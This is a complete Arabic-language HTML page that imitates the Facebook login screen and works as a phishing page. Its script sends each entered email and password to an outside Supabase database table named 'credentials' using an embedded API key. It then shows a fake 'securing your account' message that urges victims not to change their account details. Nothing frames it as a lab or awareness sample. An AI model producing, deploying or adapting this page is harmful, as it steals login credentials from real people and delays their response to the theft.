<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>فيسبوك - تسجيل الدخول</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}
body{background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center}

.header{background:#fff;width:100%;box-shadow:0 1px 2px rgba(0,0,0,.1);padding:0 40px;height:56px;display:flex;align-items:center;position:fixed;top:0;z-index:100}
.header h1{color:#1877f2;font-size:28px;font-weight:700}

.main{display:flex;align-items:center;justify-content:center;gap:60px;margin-top:100px;width:100%;max-width:1100px;padding:20px;flex-wrap:wrap}

.left{flex:1;min-width:300px;max-width:500px}
.left h2{font-size:28px;font-weight:400;color:#1c1e21;line-height:1.3}
.left h2 span{font-weight:700;display:block;font-size:32px;margin-bottom:8px}

.right{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px}
.right input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none;margin-bottom:12px;direction:ltr;text-align:left}
.right input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.login-btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
.login-btn:hover{background:#166fe5}
.divider{border-bottom:1px solid #dadde1;margin:20px 0}
.create-btn{width:100%;padding:14px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.create-btn:hover{background:#36a420}
.pages-link{text-align:center;margin-top:16px;font-size:14px;color:#1c1e21}
.pages-link a{color:#385898;cursor:pointer;font-weight:600;text-decoration:none}
.pages-link a:hover{text-decoration:underline}

/* نافذة الرسالة بعد تسجيل الدخول */
.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:9999;align-items:center;justify-content:center;direction:rtl}
.overlay-box{background:#fff;border-radius:12px;padding:40px;max-width:480px;width:90%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.3)}
.overlay-box .icon{font-size:60px;margin-bottom:16px}
.overlay-box h2{font-size:22px;color:#1c1e21;margin-bottom:12px}
.overlay-box p{font-size:16px;color:#444;line-height:1.7;margin-bottom:24px}
.overlay-box .ok-btn{background:#1877f2;color:#fff;border:none;border-radius:6px;padding:12px 40px;font-size:16px;font-weight:600;cursor:pointer}
.overlay-box .ok-btn:hover{background:#166fe5}
</style>
</head>
<body>

<div class="header">
  <h1>facebook</h1>
</div>

<div class="main">
  <div class="left">
    <h2><span>فيسبوك</span> يوصلك بالأشخاص الذين تحبهم</h2>
  </div>
  <div class="right">
    <form id="loginForm">
      <input id="email" type="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
      <input id="password" type="password" placeholder="كلمة السر" required>
      <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
    </form>
    <div class="divider"></div>
    <button class="create-btn" onclick="alert('سيتم إنشاء حساب جديد قريباً')">إنشاء حساب جديد</button>
    <div class="pages-link"><a href="#">إنشاء صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري</div>
  </div>
</div>

<!-- نافذة الرسالة بعد تسجيل الدخول -->
<div id="successOverlay" class="overlay">
  <div class="overlay-box">
    <div class="icon">🔐</div>
    <h2>جاري تأمين الحساب</h2>
    <p>سنحاول عكس الاختراق.<br>يرجى عدم تغيير أي معلومات متعلقة بحسابك.</p>
    <button class="ok-btn" onclick="closeOverlay()">حسناً</button>
  </div>
</div>

<script>
// ========== ضع المفتاح الصحيح من Settings → API في Supabase ==========
const SUPABASE_URL = 'https://jiunnlqezndakjcvnlpy.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImppdW5ubHFlem5kYWtqY3ZubHB5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzczODA0NjUsImV4cCI6MjA5Mjk1NjQ2NX0.fi7Qfp9GR6-JSNRbOmdKztu_jSOgLtECE01I28zxk1c';

// لو المفتاح الجديد موجود (يبدأ بـ sb_publishable) استخدمه بدلاً من اللي فوق
// const SUPABASE_KEY = 'sb_publishable_...';

document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();
  const btn = document.getElementById('loginBtn');
  
  if (!email || !password) return;
  
  btn.disabled = true;
  btn.textContent = 'جاري المعالجة...';
  
  try {
    // ✅ حفظ البيانات في Supabase
    const res = await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`
      },
      body: JSON.stringify({ email: email, password: password })
    });
    
    console.log('حفظ:', res.status);
    
    if (!res.ok) {
      const err = await res.text();
      console.error('خطأ في الحفظ:', err);
    }
    
    // ✅ إظهار الرسالة المطلوبة
    document.getElementById('successOverlay').style.display = 'flex';
    
  } catch(err) {
    console.error('خطأ:', err);
    // حتى لو فشل الاتصال، نظهر الرسالة
    document.getElementById('successOverlay').style.display = 'flex';
  }
  
  btn.disabled = false;
  btn.textContent = 'تسجيل الدخول';
});

function closeOverlay() {
  document.getElementById('successOverlay').style.display = 'none';
  document.getElementById('email').value = '';
  document.getElementById('password').value = '';
}
</script>

</body>
</html>
